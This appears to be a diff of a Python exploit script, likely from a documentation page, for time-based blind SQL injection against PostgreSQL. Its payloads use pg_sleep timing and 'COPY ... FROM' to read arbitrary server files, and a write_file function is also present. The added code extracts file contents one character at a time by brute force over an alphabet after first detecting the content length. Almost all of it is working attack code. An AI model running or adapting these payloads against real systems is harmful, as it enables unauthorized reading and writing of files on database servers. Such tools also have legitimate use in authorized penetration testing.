@@ -44,7 +44,7 @@ import sys
 
 # -----Config-----
 PROXY = "http://127.0.0.1:8080"
-BASE_URL = "https://test/vulnpath/vulnparameter=1"
+BASE_URL = "https://test/vulnPath?vulnParam=1"
 SLEEP_TIMER = 5
 TIMEOUT = 25
 THRESHOLD = 1.5  # Margin to account for network variance
@@ -69,7 +69,7 @@ def send_payload(payload: str) -> float:
 def is_timed_response(elapsed: float, expected: int = SLEEP_TIMER) -> bool:
     return expected <= elapsed < expected + THRESHOLD
 
-# -----SQLI Test-----
+# -----Attack Steps-----
 def test_sql_injection():
     print("[*] Testing sleep-based SQLi...")
     payload = f";SELECT+pg_sleep({SLEEP_TIMER});--"
@@ -86,17 +86,29 @@ def check_superuser():
 
 def read_file(path: str):
     print(f"[*] Attempting to read file: {path}")
-    payload = (
-        f";CREATE TEMP TABLE pwned (content TEXT); "
-        f"COPY pwned FROM $$" + path + "$$; "
-        f"SELECT CASE WHEN (ascii(substr((SELECT content FROM pwned),1,1))=72) "
-        f"THEN pg_sleep({SLEEP_TIMER}) END;--"
-    )
-    elapsed = send_payload(payload)
-    if is_timed_response(elapsed):
-        print("[+] File read timing response detected (first byte == 72 'H')")
-    else:
-        print("[-] File read failed or content mismatch.")
+    length = detect_length(path) or 30
+    print(f"[*] Attempting to extract first {length} characters of the file...")
+    ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789./_-:$@{}()[]!#%&= "
+    extracted = ""
+
+    for position in range(1, length + 1):
+        found = False
+        for ch in ALPHABET:
+            ascii_val = ord(ch)
+            payload = (
+                f"SELECT CASE WHEN (ascii(substr((SELECT content FROM pwned),{position},1))={ascii_val}) THEN pg_sleep({SLEEP_TIMER}) END;--"
+            )
+
+            elapsed = send_payload(payload)
+            if is_timed_response(elapsed):
+                extracted += ch
+                print(f"[+] Char {position}: '{ch}' (elapsed: {elapsed:.2f}s)")
+                found = True
+                break
+        if not found:
+            print(f"[-] Char {position}: not found")
+            extracted += "?"
+    print(f"\n[+] Extracted content: {extracted}")
 
 def write_file(path: str, content: str):
     print(f"[*] Attempting to write to: {path}")
@@ -106,6 +118,22 @@ def write_file(path: str, content: str):
         print("[+] File write timing response detected")
     else:
         print("[-] Write may have failed")
+
+def detect_length(path, max_len=100):
+    print(f"[*] Determining content length (max {max_len})...")
+    for length in range(1, max_len + 1):
+        payload = (
+            f";CREATE TEMP TABLE pwned (content TEXT); "
+            f"COPY pwned FROM $$" + path + "$$; "
+            f"SELECT CASE WHEN (LENGTH((SELECT content FROM pwned))={length}) "
+            f"THEN pg_sleep({SLEEP_TIMER}) END;--"
+        )
+        elapsed = send_payload(payload)
+        if is_timed_response(elapsed):
+            print(f"[+] Detected length: {length}")
+            return length
+    print("[-] Failed to determine length.")
+    return None
 
 # -----Main Menu-----
 def main():
@@ -145,5 +173,6 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 ```
 {% endcode %}
